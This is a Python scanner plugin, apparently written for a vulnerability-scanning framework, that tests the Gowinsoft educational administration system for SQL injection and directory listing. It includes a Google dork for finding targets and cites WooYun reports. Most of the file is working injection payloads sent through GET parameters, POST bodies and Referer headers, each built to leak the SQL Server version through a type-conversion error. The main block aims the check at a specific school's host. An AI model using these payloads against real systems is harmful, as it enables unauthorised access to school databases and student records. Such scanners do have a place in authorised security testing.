#!usr/bin/env python
# *-* coding:utf-8 *-*

'''
name: 金窗教务系统多处注入
author: yichin
refer:
    http://www.wooyun.org/bugs/wooyun-2010-0120584
    http://www.wooyun.org/bugs/wooyun-2015-0128788
    http://www.wooyun.org/bugs/wooyun-2010-0121349
    http://www.wooyun.org/bugs/wooyun-2010-0101234
    http://www.wooyun.org/bugs/wooyun-2015-0128788
    http://www.wooyun.org/bugs/wooyun-2010-0101741
description:
    google dork: inurl:web/web/lanmu
    ...
'''

def assign(service, arg):
    if service == 'gowinsoft_jw':
        return True, arg

def audit(arg):
    payloads1 = [
        arg + 'web/web/lanmu/wenzhaishow.asp?id=44%27%20and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))%20and%20%27abc%27=%27abc',
        arg + 'web/web/web/showfj.asp?id=1%27%20and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))%20and%20%27a%27=%27a',
        arg + 'web/web/jiu/yjxianshihui.asp?id=1%27%20and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))%20and%20%27a%27=%27a',
        arg + 'web/web/jiu/gongwenshow.asp?id=1%27%20and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))%20and%20%27a%27=%27a',
        arg + 'web/web/lanmu/gongwenshow.asp?id=1%27%20and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))%20and%20%27a%27=%27a',
        arg + 'web/web/wenzhai/lanmushow.asp?lei=1%27and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))%20and%20%27a%27=%27a',
        arg + 'web/web/xx/yjxianshihui.asp?id=1%27and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))%20and%20%27a%27=%27a',
        arg + 'web/web/bao/list.asp?bh=1%27and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))%20and%20%27a%27=%27a',
        arg + 'jiaoshi/shizi/shizi/textbox.asp?id=1%27and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))%20and%20%27a%27=%27a',
        arg + 'jiaoshi/sj/shixi/biyeshan1.asp?id=1%27and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))%20and%20%27a%27=%27a',
        arg + 'jiaoshi/xueji/dangan/sdangangai1.asp?id=1%27and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))%20and%20%27a%27=%27a',
        arg + 'jiaoshi/xueji/shen/autobh.asp?jh=1%27and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))%20and%20%27a%27=%27a',
        arg + 'jiaoshi/xueji/zhuce/iszhuce.asp?xuehao=1%27and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))%20and%20%27a%27=%27a',
        arg + 'jiaoshi/xueji/xueji/dealfxue.asp?cmdok=1&id=1%20and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))',
        
    ]
    for payload in payloads1:
        code, head, res, err, _ = curl.curl2(payload)
        if code != 0 and 'GAO JI@Microsoft SQL Server' in res:
            security_hole('SQL injection: ' + payload)
    #post型
    payloads2 = [
        arg + 'web/web/kebiao/kebiao.asp',
        arg + 'web/web/jiu/yrdw.asp',
        arg + 'web/web/jiu/yrxx.asp',
        arg + 'web/web/jiu/qzxx.asp',
        arg + 'web/web/lanmu/lqxx.asp',
        arg + 'jiaoshi/sj/shixi/search.asp',
        arg + 'web/web/bao/kaike.asp',
        arg + 'web/web/lanmu/zsjh.asp',
    ]
    post = 'selw=%C8%AB%B2%BF&sel1w=%C8%AB%B2%BF&ww=1%27+and+1%3Dconvert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))+and+%27%25%27%3D%27&o=id+desc&id=0&y=1&act=&dizhi=%2Fweb%2Fweb%2Fjiu%2Fyrdw.asp%3F&w1=&w2=&sw1=&p=10&twid=750&wid=100%2C100%2C100%2C100%2C100%2C300%2C100%2C100%2C100%2C100&vrul=y%2Cy%2Cy%2Cy%2Cy%2Cy%2Cy%2Cy%2Cy%2Cy&m=%CF%C2%B9%FD%CF%D4%B2%E9&rul=%CE%C4%2C%CE%C4%2C%CE%C4%2C%CE%C4%2C%CE%C4%2C%C6%AA&h=%D3%C3%C8%CB%B5%A5%CE%BB%D0%C5%CF%A2&rig=%CE%DE&bh=6253'
    for payload in payloads2:
        code, head, res, err, _ = curl.curl2(payload, post = post, referer=payload)
        #print payload
        #print res
        if code !=0 and 'GAO JI@Microsoft SQL Server' in res:
            security_hole('SQL injection: ' + payload + " POST: "+post)
    payload2_1 = arg + 'web/web/wenzhai/shoushow.asp'
    content_type = 'Content-Type: application/x-www-form-urlencoded'
    post2_1 = 'xz=%B0%B4%C4%DA%C8%DD&cha=1%27+and+1%3Dconvert%28int%2C%28char%2871%29%2Bchar%2865%29%2Bchar%2879%29%2Bchar%2874%29%2Bchar%2873%29%2B%40%40version%29%29+and+%27%25%27%3D%27&submit1=%B2%E9%D1%AF'
    code, head, res, err, _ = curl.curl2(payload2_1, post=post2_1, referer=payload2_1, header=content_type)
    if code != 0 and 'GAOJIMicrosoft SQL Server' in res:
        security_hole('SQL injection: ' + payload2_1 + " POST: "+post2_1)
    
    #奇葩型（需要http referer头的get型）
    payloads3 = [
        arg + 'web/web/lanmu/lanmushow.asp?lei=1%27%20and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))%20and%20%27a%27=%27a',
        arg + 'web/web/jiu/lanmushow.asp?lei=1%27%20and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))%20and%20%27a%27=%27a',
        arg + 'web/web/lanmu/lanmushow1.asp?lei=1%27%20and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))%20and%20%27a%27=%27a'
    ]
    referers = [
        arg + 'web/web/lanmu/lanmushow.asp?lei=1%27%20and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))%20and%20%27a%27=%27a',
        arg + 'web/web/jiu/lanmushow.asp?lei=1%27%20and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))%20and%20%27a%27=%27a',
        arg + 'web/web/lanmu/lanmushow1.asp?lei=1%27%20and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))%20and%20%27a%27=%27a'
    ]
    for i in range(len(payloads3)):
        code, head, res, err, _ = curl.curl2(payloads3[i], referer=referers[i])
        if code !=0 and 'GAO JI@Microsoft SQL Server' in res:
            security_hole('SQL injection: ' + payloads3[i] + " Referer: "+referers[i])

    #目录遍历
    code, head, res, err, _ = curl.curl2(arg + 'install/mzzup.asp')
    #print res
    if code == 200 and 'admin.asp' in res:
        security_info('目录遍历: ' + arg + 'install/mzzup.asp')

if __name__ == '__main__':
    from dummy import *
    audit(assign('gowinsoft_jw', 'http://www.cdtlgcxx.com:2110/')[1])